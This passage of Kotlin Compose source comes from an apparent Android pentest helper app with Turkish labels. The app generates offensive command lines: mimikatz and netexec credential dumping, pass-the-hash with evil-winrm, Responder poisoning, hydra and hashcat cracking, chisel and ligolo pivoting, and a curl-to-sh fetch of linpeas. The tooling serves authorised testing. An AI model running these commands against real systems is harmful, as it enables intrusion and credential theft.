        OutlinedTextField(value = param, onValueChange = { param = it }, label = { Text("Parametre (-p)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--batch Otomatik Seç", checked = batch, onCheckedChange = { batch = it })

        val cmd = "commix --url=\"$url\" -p $param" + if (batch) " --batch" else ""
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun Wafw00fBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("https://target.com") }
    var testAll by remember { mutableStateOf(false) }

    Column {
        OutlinedTextField(value = url, onValueChange = { url = it }, label = { Text("Hedef URL") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-a Tüm WAF İmzalarını Test Et", checked = testAll, onCheckedChange = { testAll = it })

        val cmd = "wafw00f $url" + if (testAll) " -a" else ""
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun NetExecBuilder(language: AppLanguage) {
    var proto by remember { mutableStateOf("smb") }
    var target by remember { mutableStateOf("192.168.1.0/24") }
    var user by remember { mutableStateOf("Administrator") }
    var pass by remember { mutableStateOf("Password123!") }
    var action by remember { mutableStateOf("--shares") }
    var localAuth by remember { mutableStateOf(false) }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("smb", "winrm", "ldap", "mssql").forEach { p ->
                val sel = proto == p
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) AccentPurple.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) AccentPurple else BorderDark, RoundedCornerShape(6.dp)).clickable { proto = p }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = p.uppercase(), fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) AccentPurple else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Hedef (IP / CIDR)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = user, onValueChange = { user = it }, label = { Text("Kullanıcı (-u)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = pass, onValueChange = { pass = it }, label = { Text("Parola (-p)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("--shares" to "Paylaşımlar", "--users" to "Kullanıcılar", "--sam" to "SAM Hashes", "--lsa" to "LSA Secrets", "--pass-pol" to "Parola Politikası").forEach { (act, lbl) ->
                val sel = action == act
                Box(
                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) AccentPurple.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) AccentPurple else BorderDark, RoundedCornerShape(6.dp)).clickable { action = act }.padding(horizontal = 8.dp, vertical = 5.dp)
                ) { Text(text = "$act ($lbl)", fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) AccentPurple else TextPrimary) }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--local-auth Yerel Hesap Denetimi", checked = localAuth, onCheckedChange = { localAuth = it })

        val cmd = "netexec $proto $target -u '$user' -p '$pass' $action" + if (localAuth) " --local-auth" else ""
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun Enum4linuxNgBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("10.10.10.100") }
    var mode by remember { mutableStateOf("-A") }

    Column {
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Hedef IP") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("-A" to "Tüm Testler (-A)", "-U" to "Kullanıcılar (-U)", "-S" to "Paylaşımlar (-S)", "-P" to "Politikalar (-P)").forEach { (m, lbl) ->
                val sel = mode == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }

        val cmd = "enum4linux-ng $mode $target"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun BloodHoundBuilder(language: AppLanguage) {
    var domain by remember { mutableStateOf("corp.local") }
    var dc by remember { mutableStateOf("10.10.10.1") }
    var user by remember { mutableStateOf("john") }
    var pass by remember { mutableStateOf("Password123!") }

    Column {
        OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("Domain (-d)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = dc, onValueChange = { dc = it }, label = { Text("Domain Controller IP (-dc)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = user, onValueChange = { user = it }, label = { Text("Kullanıcı (-u)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = pass, onValueChange = { pass = it }, label = { Text("Parola (-p)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }

        val cmd = "bloodhound-python -d $domain -u $user -p '$pass' -dc $dc -c All --zip"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun CertipyBuilder(language: AppLanguage) {
    var domain by remember { mutableStateOf("corp.local") }
    var user by remember { mutableStateOf("user1") }
    var pass by remember { mutableStateOf("Pass123") }
    var dcIp by remember { mutableStateOf("10.10.10.1") }

    Column {
        OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("Domain Adı") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = dcIp, onValueChange = { dcIp = it }, label = { Text("DC IP (-dc-ip)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)

        val cmd = "certipy find -u '$user@$domain' -p '$pass' -dc-ip $dcIp -vulnerable -stdout"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun KerbruteBuilder(language: AppLanguage) {
    var domain by remember { mutableStateOf("corp.local") }
    var dc by remember { mutableStateOf("10.10.10.1") }
    var userlist by remember { mutableStateOf("users.txt") }

    Column {
        OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("Domain (-d)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = dc, onValueChange = { dc = it }, label = { Text("Domain Controller IP (--dc)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)

        val cmd = "kerbrute userenum -d $domain --dc $dc $userlist"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun EvilWinrmBuilder(language: AppLanguage) {
    var ip by remember { mutableStateOf("10.10.10.100") }
    var user by remember { mutableStateOf("Administrator") }
    var passOrHash by remember { mutableStateOf("Password123!") }
    var isHash by remember { mutableStateOf(false) }

    Column {
        OutlinedTextField(value = ip, onValueChange = { ip = it }, label = { Text("Hedef IP (-i)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = user, onValueChange = { user = it }, label = { Text("Kullanıcı (-u)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = passOrHash, onValueChange = { passOrHash = it }, label = { Text(if (isHash) "NTLM Hash (-H)" else "Parola (-p)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "NTLM Hash ile Giriş (-H)", checked = isHash, onCheckedChange = { isHash = it })

        val cmd = if (isHash) "evil-winrm -i $ip -u '$user' -H '$passOrHash'" else "evil-winrm -i $ip -u '$user' -p '$passOrHash'"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun ResponderBuilder(language: AppLanguage) {
    var iface by remember { mutableStateOf("eth0") }
    var wpad by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = iface, onValueChange = { iface = it }, label = { Text("Ağ Arayüzü (-I)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-w -d WPAD Sahte Proxy", checked = wpad, onCheckedChange = { wpad = it })

        val cmd = "sudo responder -I $iface -v" + if (wpad) " -w -d" else ""
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun HashcatBuilder(language: AppLanguage) {
    var hashFile by remember { mutableStateOf("hashes.txt") }
    var hashType by remember { mutableStateOf("1000") }
    var attackMode by remember { mutableStateOf("0") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/rockyou.txt") }
    var optimizeKernels by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = hashFile, onValueChange = { hashFile = it }, label = { Text("Hash Dosyası") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("1000" to "NTLM", "0" to "MD5", "1800" to "sha512crypt", "5600" to "NetNTLMv2", "13100" to "Kerberoast", "22000" to "WPA WiFi").forEach { (m, lbl) ->
                val sel = hashType == m
                Box(
                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { hashType = m }.padding(horizontal = 8.dp, vertical = 5.dp)
                ) { Text(text = "$m ($lbl)", fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextPrimary) }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-O GPU Kernel Hızlandırma", checked = optimizeKernels, onCheckedChange = { optimizeKernels = it })

        val cmd = "hashcat -m $hashType -a $attackMode " + (if (optimizeKernels) "-O " else "") + "$hashFile $wordlist"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun JohnBuilder(language: AppLanguage) {
    var hashFile by remember { mutableStateOf("hashes.txt") }
    var format by remember { mutableStateOf("nt") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/rockyou.txt") }

    Column {
        OutlinedTextField(value = hashFile, onValueChange = { hashFile = it }, label = { Text("Hash Dosyası") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = format, onValueChange = { format = it }, label = { Text("Format (--format=nt, raw-md5, sha512crypt)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)

        val cmd = "john --format=$format --wordlist=$wordlist $hashFile"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun HydraBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("10.10.10.10") }
    var service by remember { mutableStateOf("ssh") }
    var user by remember { mutableStateOf("admin") }
    var passlist by remember { mutableStateOf("/usr/share/wordlists/rockyou.txt") }
    var exitOnFirst by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Hedef IP") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("ssh", "ftp", "rdp", "smb", "mysql").forEach { s ->
                val sel = service == s
                Box(modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { service = s }.padding(horizontal = 8.dp, vertical = 5.dp)) { Text(text = s.uppercase(), fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextPrimary) }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-f İlk Bulunan Girişte Dur", checked = exitOnFirst, onCheckedChange = { exitOnFirst = it })

        val cmd = "hydra -l $user -P $passlist" + (if (exitOnFirst) " -f" else "") + " -V $target $service"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun CewlBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("https://target.com") }
    var depth by remember { mutableStateOf("2") }
    var minLen by remember { mutableStateOf("6") }
    var outFile by remember { mutableStateOf("custom_wordlist.txt") }

    Column {
        OutlinedTextField(value = url, onValueChange = { url = it }, label = { Text("Hedef URL") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        val cmd = "cewl -d $depth -m $minLen -w $outFile $url"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun NameThatHashBuilder(language: AppLanguage) {
    var hash by remember { mutableStateOf("5f4dcc3b5aa765d61d8327deb882cf99") }
    Column {
        OutlinedTextField(value = hash, onValueChange = { hash = it }, label = { Text("Hash Metni (-t)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        val cmd = "nth -t '$hash'"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun TcpdumpBuilder(language: AppLanguage) {
    var iface by remember { mutableStateOf("eth0") }
    var filter by remember { mutableStateOf("port 80 or port 443") }
    var outFile by remember { mutableStateOf("capture.pcap") }

    Column {
        OutlinedTextField(value = iface, onValueChange = { iface = it }, label = { Text("Arayüz (-i)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = filter, onValueChange = { filter = it }, label = { Text("BPF Filtresi (örn: port 80)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)

        val cmd = "sudo tcpdump -i $iface -nn -s0 -w $outFile $filter"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun TsharkBuilder(language: AppLanguage) {
    var inFile by remember { mutableStateOf("capture.pcap") }
    var displayFilter by remember { mutableStateOf("http.request.method == \"POST\"") }

    Column {
        OutlinedTextField(value = inFile, onValueChange = { inFile = it }, label = { Text("PCAP Dosyası (-r)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = displayFilter, onValueChange = { displayFilter = it }, label = { Text("Görüntüleme Filtresi (-Y)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)

        val cmd = "tshark -r $inFile -Y '$displayFilter'"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun ChiselBuilder(language: AppLanguage) {
    var isServer by remember { mutableStateOf(false) }
    var lhost by remember { mutableStateOf("10.10.14.5") }
    var port by remember { mutableStateOf("8000") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(false to "İstemci (Client SOCKS)", true to "Sunucu (Server Reverse)").forEach { (srv, lbl) ->
                val sel = isServer == srv
                Box(modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { isServer = srv }.padding(vertical = 6.dp), contentAlignment = Alignment.Center) {
                    Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary)
                }
            }
        }
        val cmd = if (isServer) "./chisel server -p $port --reverse" else "./chisel client $lhost:$port R:1080:socks"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun LigoloBuilder(language: AppLanguage) {
    var isProxy by remember { mutableStateOf(true) }
    var lhost by remember { mutableStateOf("10.10.14.5") }
    var lport by remember { mutableStateOf("11601") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(true to "Ligolo Proxy (Saldırgan)", false to "Ligolo Agent (Kurban)").forEach { (prx, lbl) ->
                val sel = isProxy == prx
                Box(modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { isProxy = prx }.padding(vertical = 6.dp), contentAlignment = Alignment.Center) {
                    Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary)
                }
            }
        }
        val cmd = if (isProxy) "sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up && ./proxy -selfcert -laddr 0.0.0.0:$lport"
                  else "./agent -connect $lhost:$lport -ignore-cert"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun ProxychainsBuilder(language: AppLanguage) {
    var cmdInput by remember { mutableStateOf("nmap -sT -Pn 10.10.10.100") }
    Column {
        OutlinedTextField(value = cmdInput, onValueChange = { cmdInput = it }, label = { Text("Proxy Üzerinden Çalıştırılacak Komut") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        val cmd = "proxychains4 -q $cmdInput"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun SshuttleBuilder(language: AppLanguage) {
    var remoteHost by remember { mutableStateOf("user@10.10.10.50") }
    var subnet by remember { mutableStateOf("172.16.1.0/24") }
    Column {
        OutlinedTextField(value = remoteHost, onValueChange = { remoteHost = it }, label = { Text("SSH Host (-r user@host)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = subnet, onValueChange = { subnet = it }, label = { Text("Tünellenecek Alt Ağ") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        val cmd = "sshuttle -r $remoteHost $subnet -N"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun PeassNgBuilder(language: AppLanguage) {
    var isLinux by remember { mutableStateOf(true) }
    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(true to "LinPEAS (Linux)", false to "WinPEAS (Windows)").forEach { (lin, lbl) ->
                val sel = isLinux == lin
                Box(modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { isLinux = lin }.padding(vertical = 6.dp), contentAlignment = Alignment.Center) {
                    Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary)
                }
            }
        }
        val cmd = if (isLinux) "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
                  else "winpeas.exe quiet cmd fast"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun MimikatzBuilder(language: AppLanguage) {
    var action by remember { mutableStateOf("sekurlsa::logonpasswords") }
    Column {
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("sekurlsa::logonpasswords" to "Logon Passwords", "lsadump::sam" to "Dump SAM", "lsadump::lsa /patch" to "Dump LSA", "token::elevate" to "Elevate SYSTEM").forEach { (act, lbl) ->
                val sel = action == act
                Box(modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { action = act }.padding(horizontal = 8.dp, vertical = 5.dp)) { Text(text = "$act ($lbl)", fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextPrimary) }
            }
        }
        val cmd = "mimikatz.exe \"privilege::debug\" \"$action\" \"exit\""
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun PypykatzBuilder(language: AppLanguage) {
    var mode by remember { mutableStateOf("minidump") }
    var filePath by remember { mutableStateOf("lsass.dmp") }
    Column {
        OutlinedTextField(value = filePath, onValueChange = { filePath = it }, label = { Text("Dump Dosyası Yolu") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        val cmd = "pypykatz lsa $mode $filePath"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun TheHarvesterBuilder(language: AppLanguage) {
    var domain by remember { mutableStateOf("target.com") }
    var source by remember { mutableStateOf("all") }
    Column {
        OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("Hedef Domain (-d)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        val cmd = "theHarvester -d $domain -b $source -l 500"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun SherlockBuilder(language: AppLanguage) {
    var username by remember { mutableStateOf("victimuser") }
    Column {
        OutlinedTextField(value = username, onValueChange = { username = it }, label = { Text("Aranacak Kullanıcı Adı") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        val cmd = "sherlock $username --print-found"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun TruffleHogBuilder(language: AppLanguage) {
    var repoUrl by remember { mutableStateOf("https://github.com/targetorg/repo.git") }
    Column {
        OutlinedTextField(value = repoUrl, onValueChange = { repoUrl = it }, label = { Text("Git Repo URL") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        val cmd = "trufflehog git $repoUrl --only-verified"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun SearchsploitBuilder(language: AppLanguage) {
    var query by remember { mutableStateOf("Apache 2.4.49") }
    var mirrorId by remember { mutableStateOf("") }
    var doMirror by remember { mutableStateOf(false) }

    Column {
        OutlinedTextField(value = query, onValueChange = { query = it }, label = { Text("Arama Terimi (Yazılım, Sürüm veya CVE)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        val cmd = if (doMirror && mirrorId.isNotBlank()) "searchsploit -m $mirrorId" else "searchsploit $query"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun ChecksecBuilder(language: AppLanguage) {
    var binFile by remember { mutableStateOf("./vuln_binary") }
    Column {
        OutlinedTextField(value = binFile, onValueChange = { binFile = it }, label = { Text("Binary Dosyası (--file)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        val cmd = "checksec --file=$binFile"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun Rabin2Builder(language: AppLanguage) {
    var binFile by remember { mutableStateOf("./binary.elf") }
    var mode by remember { mutableStateOf("-I") }
    Column {
